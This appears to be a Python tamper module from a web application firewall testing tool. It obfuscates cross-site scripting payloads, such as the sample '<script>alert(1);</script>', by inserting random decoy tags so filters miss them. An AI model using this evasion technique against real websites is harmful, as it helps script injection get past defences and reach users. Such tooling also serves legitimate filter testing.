import re
import random


__example_payload__ = "<script>alert(1);</script>"
__type__ = "add decoy tags to the script"


def tamper(payload, **kwargs):
    retval = ""
    # https://stackoverflow.com/questions/27044221/regular-expression-to-match-different-script-tags-in-python
    searcher = re.compile(r"(<\s*?script[\s\S]*?(?:(?:src=[\'\"](.*?)[\'\"])(?:[\S\s]*?))?>)([\s\S]*?)(</script>)", re.I)
    if searcher.search(payload) is None:
        # we'll just skip payloads that aren't xss
        return payload
    decoys = (
        "<decoy>", "<lillypopper>",
        "<whatwaf>", "<xanxss>",
        "<teapot.txt>", "<svg>"
    )
    retval += random.choice(decoys)
    for char in payload:
        do_it = random.randint(1, 5) < 3
        if char == "<" and do_it:
            retval += f"{random.choice(decoys)}{char}"
        elif char == "<" or char == ">" and not do_it or char != ">":
            retval += char
        else:
            retval += f"{char}{random.choice(decoys)}"
    return retval if retval != payload else tamper(payload, **kwargs)
